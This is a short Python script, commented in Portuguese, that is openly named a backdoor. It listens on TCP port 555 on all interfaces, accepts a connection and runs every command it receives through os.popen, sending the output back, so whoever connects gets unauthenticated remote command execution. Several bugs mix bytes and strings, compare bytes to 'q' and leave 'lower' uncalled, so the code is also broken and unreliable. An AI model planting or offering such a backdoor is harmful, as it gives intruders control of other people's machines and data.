import socket
import time
import os

def my_backdoor():
    try:
    
        global meuIP
        global minhaPORT
        global socket        
        meuIP = ''
        minhaPORT = 555
        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Listado Na Porta ---->  ", str(minhaPORT))
    except Exception as f:
        print(f)

def my_connect():
    try:

        socket.bind((meuIP,minhaPORT))
        socket.listen(4)
    except Exception as f:
        print(f)

def send_commands():
    try:

        conexao,endereco = socket.accept()
        print("Conectado A --->",endereco)
        tempo = time.strftime("%H:%M")
        print("Conectado As ---- %s" % (tempo))

        while True:

            conexao.send("C:".encode("ascii"))
            data = conexao.recv(1024)
            if data == 'q':
                break
            else:
                result = '\n'
                result = os.popen(data).read()
                if (data.lower != 'q'):
                    conexao.send(str(result) + ">".encode("ascii"))
                else:
                    conexao.send(str(result) + ">".encode("ascii"))

    except Exception as f:
        print(f)


my_backdoor()
my_connect()
send_commands()